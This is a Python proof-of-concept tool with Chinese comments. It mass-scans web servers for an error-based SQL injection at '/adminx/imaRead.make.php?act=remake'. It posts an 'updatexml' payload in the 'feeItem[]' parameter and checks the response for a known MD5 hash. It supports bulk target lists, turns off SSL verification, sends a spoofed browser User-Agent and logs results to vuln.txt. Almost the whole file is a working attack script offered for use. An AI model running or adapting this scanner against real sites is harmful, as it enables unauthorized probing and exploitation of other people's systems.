import argparse
import requests
import warnings
from multiprocessing import Pool, Lock

# 忽略 SSL 证书警告
requests.packages.urllib3.disable_warnings()

# 全局初始化多进程锁，防止写文件冲突
file_lock = None

def init_pool(l):
    global file_lock
    file_lock = l

def write_to_file(content):
    """多进程安全写入文件的辅助函数"""
    if file_lock:
        file_lock.acquire()
    try:
        with open("vuln.txt", "a", encoding="utf-8") as f:
            f.write(f"{content}\n")
    finally:
        if file_lock:
            file_lock.release()
def banner():
    banner = r"""
___.          .__        .__                     
\_ |__ _____  |__|___.__.|__|___.__.__ __  ____  
 | __ \\__  \ |  <   |  ||  <   |  |  |  \/    \ 
 | \_\ \/ __ \|  |\___  ||  |\___  |  |  /   |  \
 |___  (____  /__|/ ____||__|/ ____|____/|___|  /
     \/     \/    \/         \/               \/                      
            author:toward-duck
            version:1.0.0
"""
    print(banner)
def poc(url):
    url = url.strip().rstrip("/")
    if not url.startswith("http"):
        url = "http://" + url

    target_url = f"{url}/adminx/imaRead.make.php?act=remake"
    data = {"feeItem[]": "1 AND updatexml(1,concat(0x7e,md5(12345678)),1)"}

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest",
    }

    try:
        response = requests.post(
            target_url,
            headers=headers,
            data=data,
            timeout=5,
            verify=False,
            allow_redirects=False,
        )

        if (
            "25d55ad283aa400af464c76d713c07ad" in response.text
            or "XPATH" in response.text
        ):
            # 1. 存在漏洞的格式
            msg = f"[+] {url} 存在SQL注入漏洞"
            print(msg)
            write_to_file(msg) # 写入文件
        else:
            # 2. 不存在漏洞的格式
            msg = f"[-] {url} 不存在SQL注入漏洞"
            print(msg)
            write_to_file(msg) # 同样写入文件

    except requests.RequestException:
        # 3. 请求失败的格式
        msg = f"[!] {url} 请求失败 (连接超时或拒绝访问)"
        print(msg)
        write_to_file(msg) # 同样写入文件


def main():
    banner()
    parser = argparse.ArgumentParser(description="SQL注入漏洞检测工具")
    parser.add_argument("-u", "--url", help="单个URL进行检测")
    parser.add_argument("-f", "--file", help="包含多个URL的文件，每行一个URL")
    args = parser.parse_args()

    if args.url:
        poc(args.url)
    elif args.file:
        try:
            with open(args.file, "r", encoding="utf-8") as f:
                urls = [line.strip() for line in f.readlines() if line.strip()]
        except FileNotFoundError:
            print(f"[!] 找不到文件: {args.file}")
            return

        if urls:
            print(f"[*] 开始批量检测，总计目标数: {len(urls)}")
            print("-" * 60)
            
            lock = Lock()
            with Pool(processes=5, initializer=init_pool, initargs=(lock,)) as pool:
                pool.map(poc, urls)
                
            print("-" * 60)
            print("[*] 检测扫描完成！完整报告已保存至 vuln.txt")
    else:
        print("请提供一个URL或一个包含URL的文件。使用 -h 查看帮助。")


if __name__ == "__main__":
    main()